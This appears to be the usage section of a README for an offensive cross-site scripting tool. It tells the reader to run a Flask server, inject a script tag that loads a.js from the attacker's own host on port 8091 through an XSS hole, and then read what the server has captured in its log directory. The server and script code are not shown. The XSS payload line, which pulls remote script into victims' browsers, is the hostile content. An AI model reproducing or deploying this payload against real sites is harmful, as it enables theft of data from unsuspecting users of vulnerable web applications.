
### usage
* requires python 3 and flask

run on your server:

```bash
python server.py 8091
```

load this script with an xss:
```html
<script/src="http://yourserver:8091/a.js"></script>
```

see the files in the log directory